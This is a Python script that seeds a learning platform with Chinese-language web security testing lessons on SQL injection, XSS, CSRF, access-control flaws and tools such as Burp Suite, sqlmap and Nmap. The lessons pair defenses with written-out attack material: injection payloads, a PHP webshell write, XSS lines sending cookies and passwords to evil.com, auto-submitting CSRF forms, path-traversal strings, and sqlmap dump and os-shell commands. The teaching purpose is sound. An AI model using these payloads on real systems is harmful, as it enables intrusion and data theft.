"""
TestMaster 教程内容填充脚本 V2 Part2
为新增学习路径和已有薄路径补充完整的教程章节
"""
import asyncio
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sqlalchemy import select
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker

from fastapi_backend.core.config import settings
from fastapi_backend.models.models import Base, LessonSection, LearningPath

DATABASE_URL = settings.DATABASE_URL
engine = create_async_engine(DATABASE_URL, echo=False)
async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

LESSON_CONTENT = {}

# ============================================================
# 路径1: 安全测试基础
# ============================================================
LESSON_CONTENT["安全测试基础"] = [
    {
        "title": "第1节：Web安全概述",
        "sort_order": 1,
        "knowledge_point": "安全测试基础",
        "time_estimate": 25,
        "content": """## 安全测试的重要性

在当今数字化时代，软件安全已经成为不容忽视的关键问题。根据统计，全球每年因网络攻击造成的经济损失高达数万亿美元。对于测试工程师而言，安全测试不再是可选项，而是必备技能。

安全测试的目的是发现软件系统中可能被恶意利用的漏洞，确保系统的**机密性（Confidentiality）、完整性（Integrity）和可用性（Availability）**——即信息安全的CIA三要素。

**为什么测试人员需要了解安全测试？**

1. **业务需求驱动**：随着GDPR、《个人信息保护法》等法规的实施，企业对数据安全的要求越来越高
2. **成本考量**：越早发现安全漏洞，修复成本越低。生产环境修复一个安全漏洞的成本可能是需求阶段的1000倍
3. **职业发展**：安全测试工程师是市场上薪资最高的测试岗位之一
4. **质量闭环**：安全性是非功能需求的重要组成部分，是软件质量的重要维度

## OWASP Top 10 概览

**OWASP（Open Web Application Security Project）** 是一个开源的Web应用安全项目，每3-4年发布一次Top 10 Web应用安全风险报告。最新的OWASP Top 10（2021版）包括：

| 排名 | 风险类别 | 简要说明 |
|------|----------|----------|
| A01 | 访问控制失效 | 用户越权访问数据或功能 |
| A02 | 加密机制失效 | 敏感数据未加密或加密不当 |
| A03 | 注入攻击 | SQL注入、命令注入、LDAP注入等 |
| A04 | 不安全的设计 | 架构设计层面的安全缺陷 |
| A05 | 安全配置错误 | 默认密码、错误配置等 |
| A06 | 脆弱和过时的组件 | 使用已知有漏洞的第三方库 |
| A07 | 认证和授权失败 | 身份验证机制缺陷 |
| A08 | 软件和数据完整性失效 | CI/CD管道安全问题 |
| A09 | 安全日志和监控失效 | 缺乏日志记录和告警机制 |
| A10 | SSRF（服务器端请求伪造） | 服务器端发起恶意请求 |

## 安全测试与渗透测试的区别

很多初学者容易把安全测试和渗透测试混为一谈，实际上两者有显著区别：

| 维度 | 安全测试 | 渗透测试 |
|------|----------|----------|
| 目标 | 全面评估系统安全性 | 模拟黑客攻击获取敏感信息 |
| 范围 | 覆盖所有安全需求 | 通常聚焦特定攻击面 |
| 方法 | 有计划、系统性测试 | 探索性、攻击性思维 |
| 执行者 | 测试/安全工程师 | 渗透测试专家/白帽黑客 |
| 产出 | 安全缺陷报告、风险评估 | 渗透报告、漏洞利用证明 |
| 频率 | 每次迭代/持续进行 | 定期/项目里程碑 |

安全测试更偏向"防守方思维"，思考如何保护系统安全；渗透测试更偏向"攻击方思维"，思考如何突破防线。两者相辅相成，共同构成完整的安全评估体系。

## 安全测试在SDLC中的位置

安全测试应该贯穿整个软件开发生命周期（SDLC），这就是"安全左移（Shift Left Security）"的核心理念：

```
需求阶段 → 安全需求分析、威胁建模（STRIDE）
设计阶段 → 安全架构评审、攻击面分析
开发阶段 → 静态代码扫描（SAST）、代码审查
测试阶段 → 动态安全测试（DAST）、模糊测试
部署阶段 → 配置安全扫描、容器安全扫描
运维阶段 → 持续安全监控、渗透测试、漏洞管理
```

**DevSecOps** 将安全融入DevOps的每个环节，让安全成为每个人的责任，而不仅仅是安全团队的事情。

## 本节小结

安全测试不是一门独立的技术，而是一种思维方式。接下来的章节将详细介绍SQL注入、XSS、CSRF等常见Web漏洞的原理和测试方法。掌握安全测试，你不仅能更好地保障产品质量，还能建立起更有深度的技术视野。"""
    },
    {
        "title": "第2节：SQL注入",
        "sort_order": 2,
        "knowledge_point": "SQL注入原理与防御",
        "time_estimate": 30,
        "content": """## SQL注入原理

SQL注入（SQL Injection，简称SQLi）是最常见、危害最大的Web安全漏洞之一。攻击者通过在输入字段中插入恶意的SQL代码，操纵后端数据库查询，从而窃取、篡改或删除数据。

**攻击的本质**：应用程序将用户输入不当地拼接到SQL查询语句中，导致攻击者可以改变SQL语句的原始语义。

## SQL注入的类型

### 1. 数字型注入

当参数为数字类型且直接拼接到SQL中时产生：

'''sql
-- 原始查询
SELECT * FROM users WHERE id = 1;

-- 攻击者输入: 1 OR 1=1
SELECT * FROM users WHERE id = 1 OR 1=1;
-- 返回所有用户！
'''

### 2. 字符型注入

当参数为字符串类型时需要闭合引号：

'''sql
-- 原始查询
SELECT * FROM users WHERE username = 'admin';

-- 攻击者输入: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1';
-- 同样返回所有用户！

-- 利用注释符绕过
-- 攻击者输入: admin' --
SELECT * FROM users WHERE username = 'admin' --';
-- -- 后的内容被注释掉
'''

### 3. 搜索型注入

搜索功能的模糊匹配常使用LIKE关键字，同样存在注入风险：

'''sql
-- 原始查询
SELECT * FROM products WHERE name LIKE '%手机%';

-- 攻击者输入: %' OR 1=1 --
SELECT * FROM products WHERE name LIKE '%%' OR 1=1 --%';
'''

### 4. 盲注（Blind SQL Injection）

当应用程序不直接返回数据库错误信息或查询结果时，攻击者通过"是/否"问题逐位推断数据：

**布尔盲注**：通过页面行为差异（正常页面 vs 错误页面）推断数据。

'''sql
-- 判断数据库名第一个字符是否为'a'
admin' AND SUBSTRING((SELECT database()),1,1)='a' --

-- 判断表名的长度
admin' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)=5 --
'''

**时间盲注**：通过页面响应时间差异推断数据。

'''sql
-- 如果条件成立，延时5秒响应
admin' AND IF(SUBSTRING((SELECT database()),1,1)='t', SLEEP(5), 0) --
'''

### 5. 报错注入

利用数据库的错误信息泄露数据：

'''sql
-- MySQL UpdateXML报错注入
admin' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1) --

-- SQL Server convert报错
admin' AND 1=convert(int, (SELECT @@version)) --
'''

## SQL注入的危害

SQL注入可以导致以下严重后果：

1. **数据泄露**：获取数据库中所有敏感信息（用户名、密码、银行卡号等）
2. **数据篡改**：修改、删除数据库中的记录
3. **权限提升**：利用注入获取管理员权限
4. **操作系统入侵**：通过`xp_cmdshell`（SQL Server）或`INTO OUTFILE`（MySQL）执行系统命令
5. **拒绝服务**：通过大量查询消耗数据库资源

'''sql
-- MySQL写入Webshell
SELECT '<?php eval($_POST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
'''

## 防御方法

### 1. 参数化查询（Prepared Statements）

**这是防御SQL注入最有效的方法**。将SQL结构与数据分离，确保用户输入永远不会被解释为SQL代码。

'''python
# 不安全的写法
cursor.execute(f"SELECT * FROM users WHERE username = '{user_input}'")

# 安全的参数化查询
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
'''

'''java
// Java PreparedStatement
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, userInput);
'''

### 2. ORM框架

使用ORM（如SQLAlchemy、Hibernate）可以很大程度避免SQL注入，因为ORM会自动参数化查询。但要注意：**原生的SQL查询仍然有注入风险**。

'''python
# 安全：ORM方式
user = session.query(User).filter(User.username == user_input).first()

# 不安全：原始SQL拼接
session.execute(f"SELECT * FROM users WHERE username = '{user_input}'")

# 安全：即使使用原始SQL，也要用参数化
session.execute(text("SELECT * FROM users WHERE username = :name"), {"name": user_input})
'''

### 3. 输入验证与过滤

- **白名单验证**：只允许符合预期格式的输入（如用户名只允许字母数字下划线）
- **类型检查**：确保数值参数确实是数字类型
- **转义特殊字符**：对单引号、双引号、反斜杠等进行转义（不如参数化查询可靠）

### 4. 最小权限原则

数据库账户只授予必需的最小权限：
- Web应用使用的数据库账户不应有DROP TABLE、CREATE TABLE等DDL权限
- 不同模块使用不同权限级别的账户
- 存储过程配合EXECUTE权限使用

### 5. 其他防御措施

- WAF（Web应用防火墙）：在应用层拦截恶意请求
- 隐藏数据库错误信息：生产环境不显示具体的SQL错误
- 定期安全扫描：使用SQLMap等工具进行自动化检测

## SQL注入测试方法

'''bash
# 使用SQLMap进行自动化检测
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# POST请求测试
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" -p username

# 从Burp Suite请求文件导入
sqlmap -r request.txt -p username
'''

## 本节小结

SQL注入虽然"古老"，但至今仍是OWASP Top 10中的高危风险。记住防御的核心原则：**永远不要信任用户输入，始终使用参数化查询**。这在面试中也是高频考点，务必理解原理并能写出防御代码。"""
    },
    {
        "title": "第3节：XSS跨站脚本攻击",
        "sort_order": 3,
        "knowledge_point": "XSS攻击与防御",
        "time_estimate": 30,
        "content": """## XSS攻击原理

XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到目标网站的页面中，当其他用户浏览该页面时，恶意脚本在用户浏览器中执行，从而窃取用户信息或执行未授权操作。

注意：这里的"跨站"并非真正跨域，而是指**攻击脚本在目标网站的上下文中执行**。为避免与CSS混淆，缩写为XSS。

## XSS的三种类型

### 1. 反射型XSS（Reflected XSS）

最常见但通常危害相对较小的类型。恶意脚本通过URL参数/表单提交等"反射"回来，只在当前请求中生效。

**攻击流程**：
```
攻击者构造恶意URL → 发送给受害者 → 受害者点击 → 
服务器将参数回显到页面 → 恶意脚本在受害者浏览器中执行
```

**示例**：

'''html
<!-- 正常URL -->
http://site.com/search?q=手机

<!-- 页面回显：您搜索的关键词是：手机 -->

<!-- 攻击URL -->
http://site.com/search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- 如果未过滤，页面会执行这段JS，将用户Cookie发送到攻击者服务器 -->
'''

### 2. 存储型XSS（Stored XSS）

最危险的XSS类型。恶意脚本被**永久存储**在目标服务器上（如数据库、留言板、用户资料），每次用户访问受影响的页面时都会触发。

**攻击流程**：
```
攻击者提交含恶意脚本的内容 → 服务器存储到数据库 → 
普通用户访问页面 → 服务器从数据库读取并在页面输出 → 
恶意脚本在每个用户浏览器中执行
```

**典型场景**：论坛帖子、商品评论、用户昵称、私信等任何允许用户输入并展示的地方。

'''html
<!-- 攻击者在留言板提交 -->
评论内容：这个产品真好！<script>
  new Image().src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

<!-- 任何访问该评论页面的用户，其Cookie都会被发送到evil.com -->
'''

**存储型XSS的危害**：
- 窃取所有访问者的会话Cookie
- 篡改页面内容（如广告/钓鱼表单）
- 键盘记录
- 蠕虫式自动传播（如Samy蠕虫）

### 3. DOM型XSS

和前两种不同，DOM型XSS的恶意代码不经过服务器端，完全在**客户端**通过JavaScript操作DOM产生。服务器响应本身是正常的，漏洞在客户端JS代码中。

'''javascript
// 不安全的JS代码
var keyword = location.hash.substring(1);
document.getElementById('result').innerHTML = "搜索：" + keyword;

// 攻击者构造URL
http://site.com/page#<img src=x onerror=alert(1)>

// innerHTML会将img标签插入DOM并触发onerror
'''

**反射型XSS vs DOM型XSS**：
- 反射型：服务器回显了恶意参数
- DOM型：服务器端响应正常，客户端JS处理不当导致执行

## XSS Payload 示例

实际攻击中，XSS的Payload远不止弹窗那么简单：

'''html
<!-- 窃取Cookie -->
<script>document.location='http://evil.com?c='+document.cookie</script>

<!-- 劫持表单 -->
<script>
document.querySelector('form').action = 'http://evil.com/steal';
</script>

<!-- 钓鱼弹窗 -->
<script>
var pwd = prompt('会话已过期，请重新输入密码：');
new Image().src = 'http://evil.com?pwd=' + pwd;
</script>

<!-- 绕过简单过滤 -->
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<a href="javascript:alert(1)">点击</a>

<!-- 无script标签的XSS（事件处理器） -->
<img src=1 onerror="fetch('http://evil.com/'+document.cookie)">
<svg onload="eval(atob('base64编码的恶意代码'))">
'''

## XSS防御措施

### 1. 输出编码（Output Encoding）

根据输出上下文选择合适的编码方式。这是最核心的防御手段。

| 上下文 | 编码方式 | 示例 |
|--------|----------|------|
| HTML文本 | HTML实体编码 | `<` → `&lt;` `>` → `&gt;` |
| HTML属性 | HTML属性编码 | `"` → `&quot;` |
| JavaScript | JS编码 | `\x3C` |
| URL | URL编码 | `<` → `%3C` |
| CSS | CSS编码 | `\3C` |

'''python
# Python使用html.escape进行HTML编码
import html
safe_output = html.escape(user_input)
# '<script>' → '&lt;script&gt;'
'''

'''javascript
// 安全的DOM操作
// 不要用：element.innerHTML = userInput;
// 使用：
element.textContent = userInput;  // 自动转义
// 或
element.setAttribute('data-value', userInput);  // 属性值自动转义
'''

### 2. CSP（Content Security Policy）

内容安全策略是一种浏览器安全机制，通过HTTP响应头限制页面可以加载和执行的资源。

'''http
# 严格的CSP策略
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self';

# 禁止内联脚本和eval
Content-Security-Policy: script-src 'self' 'nonce-{随机值}';
'''

CSP可以非常有效地阻止XSS攻击，即使攻击者成功注入了脚本标签，浏览器也不会执行。

### 3. HttpOnly Cookie

设置Cookie的HttpOnly属性，使其无法通过JavaScript的`document.cookie`访问，有效防止Cookie被XSS窃取。

'''http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
'''

### 4. 输入验证

- **白名单验证**：只允许合法的输入模式
- **长度限制**：限制用户输入长度
- 使用成熟的HTML净化库（如DOMPurify、OWASP Java HTML Sanitizer）

### 5. X-XSS-Protection（已废弃）

现代浏览器已弃用该响应头，推荐使用CSP替代。

'''http
X-XSS-Protection: 0  # 关闭浏览器自带的XSS过滤（因为它本身可能被滥用）
'''

## XSS测试工具

- **XSStrike**：高级XSS检测工具，自带智能Payload生成
- **Burp Suite**：通过Repeater手动测试，Scanner自动扫描
- **浏览器开发者工具**：直接测试DOM型XSS
- **常用测试Payload**：`<script>alert('XSS')</script>` 然后逐步升级复杂度

## 本节小结

XSS攻击是"注入类"攻击的典型代表。防御的关键是：**对所有不可信数据进行输出编码，并使用CSP作为纵深防御的第二道防线**。在实践中，优先使用成熟框架的内置防护（如React的自动转义、Django模板引擎的自动转义），而不是手动编写过滤逻辑。"""
    },
    {
        "title": "第4节：CSRF跨站请求伪造",
        "sort_order": 4,
        "knowledge_point": "CSRF攻击与防御",
        "time_estimate": 25,
        "content": """## CSRF攻击原理

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种诱骗已登录用户在不知情的情况下执行非本意操作的攻击。攻击者利用用户已在目标网站登录的身份，以用户的名义发送恶意请求。

**核心原理**：浏览器的Cookie自动携带机制——当用户向某个网站发起请求时，浏览器会自动附带该网站的Cookie，包括身份认证Cookie。

## CSRF攻击场景

典型的CSRF攻击场景（以银行为例）：

```
1. 用户登录银行网站 bank.com，浏览器保存了认证Cookie
2. 用户在没有退出银行网站的情况下，访问了一个恶意网站 evil.com
3. 恶意网站包含如下代码：
   <img src="http://bank.com/transfer?to=attacker&amount=10000">
4. 浏览器向bank.com发送请求，自动携带了之前的认证Cookie
5. 银行服务器认为请求来自合法用户，执行了转账操作
```

## GET型CSRF

利用GET请求伪造操作：

'''html
<!-- 最简单的GET型CSRF：图片标签 -->
<img src="http://target.com/user/delete?id=123" style="display:none;">

<!-- 利用链接 -->
<a href="http://target.com/api/changeEmail?email=attacker@evil.com">点击领取奖品</a>

<!-- 利用表单自动提交 -->
<form action="http://target.com/api/transfer" method="GET">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
'''

> 按照RESTful规范，GET请求应该是幂等且安全的（只读不写），但实际很多Web应用没有遵循这一原则。

## POST型CSRF

利用POST请求伪造操作（更常见，危害更大）：

'''html
<!-- 自动提交的隐藏表单 -->
<form action="http://target.com/api/transfer" method="POST" id="csrf_form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="currency" value="USD">
</form>
<script>document.getElementById('csrf_form').submit();</script>

<!-- 利用AJAX（受同源策略限制，但表单提交不受限） -->
<!-- JSONP漏洞也可能被用于CSRF -->
'''

## CSRF与XSS的区别

| 维度 | CSRF | XSS |
|------|------|-----|
| 攻击目标 | 利用用户的身份执行操作 | 窃取用户数据或在浏览器执行脚本 |
| 运行位置 | 在用户不知情下发起请求 | 在目标网站页面中执行脚本 |
| 是否利用信任 | 利用网站对用户浏览器的信任 | 利用用户对网站的信任 |
| 是否需要登录 | 需要用户已登录目标网站 | 不一定需要登录 |

XSS比CSRF危害更大：如果一个网站存在XSS漏洞，攻击者可以读取页面上的CSRF Token，从而绕过CSRF防御。

## CSRF防御措施

### 1. CSRF Token（最广泛使用）

服务器生成一个随机Token，嵌入表单中。每次提交时验证Token是否匹配。攻击者无法获取到该Token。

'''html
<!-- 服务器端生成Token并渲染到表单中 -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a8f3b2c1...">
    <input name="to">
    <input name="amount">
    <button type="submit">转账</button>
</form>
'''

'''python
# Flask/Python实现示例
import secrets
from flask import session, request, abort

def generate_csrf_token():
    if '_csrf_token' not in session:
        session['_csrf_token'] = secrets.token_hex(32)
    return session['_csrf_token']

def validate_csrf():
    token = request.form.get('csrf_token')
    if not token or token != session.get('_csrf_token'):
        abort(403)
'''

### 2. Referer/Origin校验

检查请求的Referer或Origin头，确认请求来自合法的源。

'''python
def check_referer():
    referer = request.headers.get('Referer')
    if not referer:
        return False
    from urllib.parse import urlparse
    parsed = urlparse(referer)
    # 只允许来自本站的请求
    return parsed.netloc == 'myapp.com'
'''

> **注意**：Referer头可能被浏览器策略或用户配置隐藏，因此不应单独依赖Referer校验。

### 3. SameSite Cookie属性

这是近年来浏览器引入的最优雅的CSRF防御方式。

'''http
# Strict：完全禁止跨站发送Cookie（最安全，但可能影响用户体验）
Set-Cookie: session_id=abc123; SameSite=Strict

# Lax：允许顶级导航（如点击链接）发送Cookie，禁止POST/iframe/img等请求发送
Set-Cookie: session_id=abc123; SameSite=Lax

# None：不限制（需配合Secure）
Set-Cookie: session_id=abc123; SameSite=None; Secure
'''

**SameSite属性效果对比**：

| 场景 | Strict | Lax | None |
|------|--------|-----|------|
| 同站请求 | 发送 | 发送 | 发送 |
| 从外部页面链接跳转 | 不发送 | 发送 | 发送 |
| 跨站表单POST | 不发送 | 不发送 | 发送 |
| 跨站img/src/iframe请求 | 不发送 | 不发送 | 发送 |

### 4. 双重Cookie验证

在Cookie和请求参数中设置相同的随机值，服务器验证两者是否一致。

### 5. 自定义请求头

使用自定义请求头（如`X-Requested-With: XMLHttpRequest`），由于浏览器同源策略不允许跨域设置自定义头，可以防御简单的CSRF。但这不是100%可靠。

### 6. 重要操作二次验证

对于转账、修改密码等敏感操作，要求用户输入密码或进行验证码验证。

## 综合防御策略

最佳实践是**多层防御**：

1. **优先使用SameSite=Lax Cookie**（现代浏览器支持良好）
2. **辅以CSRF Token**（覆盖SameSite不被支持的情况）
3. **敏感操作要求二次确认**
4. **GET请求只做只读操作**

## 本节小结

CSRF攻击利用了"浏览器自动携带Cookie"这一机制。防御的核心是确保请求来自用户真实的意图，而非被第三方网站伪造。SameSite Cookie是最优雅的防御方案，而CSRF Token是最广泛使用的兜底方案。"""
    },
    {
        "title": "第5节：敏感信息泄露与权限漏洞",
        "sort_order": 5,
        "knowledge_point": "信息泄露与权限漏洞",
        "time_estimate": 25,
        "content": """## 水平越权与垂直越权

### 水平越权（IDOR - Insecure Direct Object Reference）

水平越权是指**同级别用户**之间互相访问对方的数据或执行对方的操作。攻击者和受害者拥有相同的权限级别，但攻击者通过修改请求参数中的资源标识来访问不属于自己的资源。

**典型场景**：

'''
POST /api/order/12345/view     # 用户A查看自己的订单12345
POST /api/order/12346/view     # 用户A修改order_id为12346，尝试查看用户B的订单
'''

如果服务器只验证了用户是否登录，但没有验证**该订单是否属于当前用户**，就会产生水平越权。

'''python
# 存在水平越权的代码
@app.route('/api/order/<int:order_id>')
def view_order(order_id):
    user = get_current_user()  # 只验证了登录
    order = Order.query.get(order_id)  # 没有检查订单归属！
    return order.to_dict()

# 修复后
@app.route('/api/order/<int:order_id>')
def view_order(order_id):
    user = get_current_user()
    order = Order.query.filter_by(id=order_id, user_id=user.id).first()
    if not order:
        abort(404)  # 不存在或无权限，统一返回404（避免信息泄露）
    return order.to_dict()
'''

### 垂直越权（Privilege Escalation）

垂直越权是指**低权限用户**执行了**高权限用户**才能执行的操作。

**两种类型**：

1. **向上升级**：普通用户执行管理员操作
   - 普通用户直接访问 `/admin/delete_user/5`
   - 普通用户通过修改参数role='admin'提升自己

2. **向下降级**：管理员操作普通用户但超出了合理范围
   - 管理员可以修改任意用户资料这是合理的
   - 但不应能查看用户的明文密码

**测试方法**：
1. 以低权限用户登录，记录所有可访问的API
2. 退出登录，以高权限用户登录，记录管理员API
3. 尝试用低权限用户的Token/会话访问管理员API
4. 尝试修改请求参数中的角色标识

## 目录遍历（Directory Traversal）

目录遍历（也称为路径遍历）是指攻击者通过构造特殊的文件路径（如`../`）来访问Web根目录之外的文件。

**攻击示例**：

'''
# 正常请求
http://site.com/download?file=report.pdf

# 目录遍历攻击
http://site.com/download?file=../../../../etc/passwd
http://site.com/download?file=....//....//....//etc/passwd  # 绕过简单过滤
http://site.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd  # URL编码绕过
'''

'''python
# 不安全的文件下载
file_path = "/var/www/uploads/" + request.args.get('file')
return send_file(file_path)  # 攻击者可以遍历到任意文件！

# 安全的实现
import os
safe_dir = "/var/www/uploads/"
requested_path = os.path.realpath(os.path.join(safe_dir, request.args.get('file')))
if not requested_path.startswith(os.path.realpath(safe_dir)):
    abort(403)
return send_file(requested_path)
'''

## 敏感信息泄露

### 常见的敏感信息泄露场景

**1. API响应中暴露过多数据**

'''json
// 不安全的响应：返回了密码哈希、内部ID等
{
  "user": {
    "id": 5,
    "username": "admin",
    "password_hash": "$2b$12$...",
    "internal_note": "VIP客户",
    "ssn": "123-45-6789"
  }
}

// 安全的响应：仅返回前端需要的信息
{
  "user": {
    "username": "admin",
    "avatar_url": "https://..."
  }
}
'''

**2. 错误信息泄露**

'''
# 数据库错误泄露表结构
SQL Error: Table 'myapp.users' doesn't exist
SQL Error: Column 'password_hash' not found in 'field list'

# 堆栈跟踪泄露内部路径
File "/var/www/myapp/api/user.py", line 45
File "C:\\Users\\dev\\project\\secret.py"
'''

**3. 前端源码泄露敏感信息**

'''javascript
// 前端代码中硬编码的密钥（严重！）
const API_KEY = "sk-abc123def456ghi789";
const AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

// 前端注释中的敏感信息
// TODO: 管理员密码暂设为 admin123，上线前改掉
'''

**4. robots.txt泄露敏感路径**

如果网站在robots.txt中列出了不希望被爬取的敏感路径，反而等于"此地无银三百两"。

'''
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /phpmyadmin/
'''

### 前端加密的误区

很多开发者认为"前端加密了就是安全的"，这是一个常见的误区：

- **前端哈希不是安全措施**：即使前端把密码哈希后再传输，攻击者可以直接发送哈希值登录（哈希值变成了事实上的密码）
- **前端加密密钥暴露**：前端代码对所有人可见，任何加密密钥都可以被提取
- **前端加密的正确用途**：防止中间人网络嗅探（但HTTPS已经解决了这个问题）

**结论**：真正的安全逻辑必须在服务端实现，前端加密只是"锦上添花"而非"雪中送炭"。

## 防御措施

1. **权限验证必须在服务端**：永远不要依赖前端隐藏按钮来控制权限
2. **应用"最小数据原则"**：API只返回必要字段
3. **统一错误页面**：生产环境不应该显示详细的错误信息
4. **代码审查敏感信息**：定期检查git仓库、源码中是否包含密钥
5. **使用API网关**：统一的认证鉴权入口

## 本节小结

权限漏洞和信息泄露是测试中最容易被忽视但又极其重要的问题。记住核心原则：**永远不要信任客户端传来的任何资源标识、角色标识和权限参数，一切验证以服务端为准**。"""
    },
    {
        "title": "第6节：安全测试工具与实践",
        "sort_order": 6,
        "knowledge_point": "安全测试工具",
        "time_estimate": 25,
        "content": """## Burp Suite 基本使用

Burp Suite 是Web安全测试领域最主流的工具，由PortSwigger公司开发。社区版免费但功能有限，专业版功能全面。

### 核心功能模块

| 模块 | 功能 | 用途 |
|------|------|------|
| Proxy | HTTP代理拦截 | 拦截、查看、修改请求/响应 |
| Repeater | 请求重放 | 手动修改并重发请求 |
| Intruder | 攻击器 | 自动化参数爆破/Fuzzing |
| Scanner | 扫描器 | 自动检测漏洞（专业版） |
| Decoder | 编解码 | URL编码/Base64/Hash等 |
| Comparer | 对比器 | 对比请求或响应的差异 |

### 基本工作流程

'''bash
1. 配置浏览器代理为 127.0.0.1:8080
2. 安装Burp的CA证书（用于拦截HTTPS）
3. 在Proxy → Intercept中开启拦截
4. 浏览器访问目标网站，Burp会拦截请求
5. 右键请求 → Send to Repeater
6. 在Repeater中修改参数测试各种Payload
'''

### 实用技巧

- **Scope设置**：在Target → Scope中添加目标域名，过滤掉无关流量
- **Intruder攻击类型**：
  - Sniper：用一个字典逐个测试单个位置
  - Battering ram：用一个字典同时测试多个位置（相同值）
  - Pitchfork：用多个字典同时测试多个位置（一一对应）
  - Cluster bomb：用多个字典测试所有组合
- **Match and Replace**：自动替换请求中的参数，如修改User-Agent

## SQLMap自动化注入检测

SQLMap是自动化检测和利用SQL注入漏洞的开源工具，功能极其强大。

### 基本使用

'''bash
# 基本检测
sqlmap -u "http://target.com/page.php?id=1"

# 获取所有数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 获取指定数据库的所有表
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 导出指定表的数据
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# POST请求
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123"

# 从文件读取请求
sqlmap -r request.txt

# 调整检测级别和风险
sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2

# 使用Tor匿名
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
'''

### 高级技巧

'''bash
# 绕过WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# 随机延时和User-Agent
sqlmap -u "http://target.com/page.php?id=1" --delay=2 --random-agent

# 获取操作系统Shell（需满足条件）
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 文件读取
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
'''

### 检测级别说明

| Level | 检测范围 |
|-------|----------|
| 1（默认） | GET/POST参数 |
| 2 | +HTTP Cookie |
| 3 | +HTTP User-Agent/Referer头 |
| 4 | +更多HTTP头 |
| 5 | +Host头 |

## Nmap端口扫描

Nmap是网络扫描和主机发现的神器，在安全测试中用于发现目标系统开放的服务和端口。

### 常用扫描命令

'''bash
# 基本TCP扫描
nmap target.com

# 快速扫描常用1000端口
nmap -F target.com

# 扫描全部65535个端口
nmap -p- target.com

# 服务版本探测
nmap -sV target.com

# 操作系统探测
nmap -O target.com

# 综合扫描（OS、版本、脚本、路由跟踪）
nmap -A target.com

# 指定端口范围
nmap -p 80,443,8000-9000 target.com

# 防火墙躲避（碎片包）
nmap -f target.com

# 慢速扫描（减少被检测概率）
nmap -T2 target.com
'''

### Nmap脚本引擎（NSE）

'''bash
# 查看可用脚本
ls /usr/share/nmap/scripts/

# HTTP相关安全检测脚本
nmap --script=http-enum target.com        # 枚举HTTP服务
nmap --script=http-methods target.com     # 检测允许的HTTP方法
nmap --script=http-sql-injection target.com # SQL注入检测
nmap --script=http-headers target.com     # 检测安全头
nmap --script=ssl-enum-ciphers target.com # SSL/TLS密码套件
nmap --script=vuln target.com             # 漏洞检测
'''

## 安全测试Checklist

一个全面的Web安全测试Checklist：

**认证与授权**
- [ ] 密码强度要求是否足够
- [ ] 是否存在暴力破解防护（验证码/锁定机制）
- [ ] 是否使用HTTPS传输登录凭证
- [ ] 是否存在水平越权（修改ID参数）
- [ ] 是否存在垂直越权（普通用户访问管理员功能）
- [ ] 会话Token是否具有足够的随机性和长度
- [ ] 退出登录后Session/Token是否失效

**注入类**
- [ ] 所有输入点是否进行了SQL注入测试
- [ ] 搜索功能是否进行了XSS测试
- [ ] 文件上传是否存在任意文件上传漏洞
- [ ] 是否存在命令注入点（如ping、nslookup功能）
- [ ] URL参数是否存在路径遍历

**数据传输与存储**
- [ ] 是否全站使用HTTPS
- [ ] 敏感数据在传输中是否加密
- [ ] Cookie是否设置了Secure/HttpOnly/SameSite
- [ ] 响应中是否包含敏感信息
- [ ] API是否返回了不必要的内部数据

**配置与部署**
- [ ] 服务器是否暴露了版本信息
- [ ] 是否有默认密码未修改
- [ ] CORS配置是否过于宽松（Access-Control-Allow-Origin: *）
- [ ] 安全相关HTTP头是否配置（CSP、HSTS、X-Frame-Options等）
- [ ] 是否暴露了敏感的后台管理入口

**业务逻辑**
- [ ] 订单金额是否可在客户端修改
- [ ] 优惠券是否可重复使用
- [ ] 是否存在绕过支付流程的方法
- [ ] 并发请求是否导致条件竞争

## 其他常用安全测试工具

| 工具 | 用途 | 说明 |
|------|------|------|
| OWASP ZAP | Web安全扫描 | Burp的开源替代品 |
| Nikto | Web服务器扫描 | 检测服务器配置问题 |
| DirBuster | 目录枚举 | 发现隐藏的目录和文件 |
| Hydra | 密码爆破 | 在线暴力破解工具 |
| Wireshark | 网络抓包 | 分析网络流量 |
| Metasploit | 渗透测试框架 | 全面的漏洞利用工具 |
